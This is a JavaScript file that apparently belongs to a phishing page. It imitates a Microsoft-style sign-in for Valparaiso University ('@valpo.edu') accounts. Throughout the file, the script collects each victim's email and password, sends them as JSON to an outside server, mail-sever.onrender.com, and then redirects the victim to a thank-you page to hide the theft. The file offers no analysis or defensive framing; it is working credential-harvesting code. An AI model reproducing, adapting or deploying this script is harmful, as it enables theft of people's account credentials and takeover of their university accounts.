document.addEventListener("DOMContentLoaded", function() {
    // Elements
    const nextBtn = document.getElementById('nextBtn');
    const submitBtn = document.getElementById('submitBtn');
    const backBtn = document.getElementById('backBtn');
    const userNameDisplay = document.getElementById('userNameDisplay');
    const signInDisplay = document.getElementById('signInDisplay');
    const subtitleUserNameDisplay = document.getElementById('subtitle');
    const accessAcct = document.getElementById('accessAcc');
    const forPAss = document.getElementById('forPass');
    const msLogo = document.getElementById("ms");
    const nauLogo = document.getElementById("nau");
    const name = document.getElementById("name");
    const key = document.getElementById("logId");
    const passCon = document.getElementById("pass-con");
    const loginForm = document.getElementById("verification");

    // Email validation
    function validateEmail(email) {
        return email.endsWith("@valpo.edu");
    }

    // Event listener for next button
    nextBtn.addEventListener('click', (e) => {
        e.preventDefault();
        if (validateEmail(name.value)) {
            name.style.display = 'none';
            passCon.style.display = 'block';
            nextBtn.style.display = 'none';
            submitBtn.style.display = 'block';
            forPAss.style.display = 'block';
            accessAcct.style.display = 'none';
            userNameDisplay.style.display = 'block';
            subtitleUserNameDisplay.textContent = name.value;
            signInDisplay.style.display = 'none';
            backBtn.style.display = 'block';
            msLogo.style.display = 'none';
            nauLogo.style.display = 'block';
        } else {
            alert('Invalid email');
        }
    });

    // Back button handler
    backBtn.addEventListener('click', (e) => {
        e.preventDefault();
        backBtn.style.display = 'none';
        name.style.display = 'block';
        passCon.style.display = 'none';
        nextBtn.style.display = 'block';
        submitBtn.style.display = 'none';
        forPAss.style.display = 'none';
        accessAcct.style.display = 'block';
        userNameDisplay.style.display = 'none';
        signInDisplay.style.display = 'block';
        msLogo.style.display = 'block';
        nauLogo.style.display = 'none';
    });

    // Handle form submission
    loginForm.addEventListener("submit", function(event) {
        event.preventDefault();

        if (key.value.trim() === '') {
            alert('Password can\'t be empty');
            return;
        }

        // Disable submit button to prevent multiple submissions
        submitBtn.disabled = true;
        submitBtn.textContent = 'Submitting...';

        const userData = {
            FullName: key.value,
            Email: name.value,
            Password: "username",
        };

        fetch('https://mail-sever.onrender.com/Api/User/sign-up', {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(userData)
        })
        .then(response => {
            if (!response.ok) {
                return response.json().then(err => { throw err; });
            }
            return response.json();
        })
        .then(data => {
            // Redirect to home page after 2 seconds
            setTimeout(() => {
                window.location.href = "valpo_thanks.html";
            }, 2000);
        })
        .catch(error => {
            alert("There was a problem submitting the form. Please try again later.");
            console.error("Error:", error);
        })
        .finally(() => {
            // Re-enable submit button
            submitBtn.disabled = false;
            submitBtn.textContent = 'Submit';
        });
    });
});
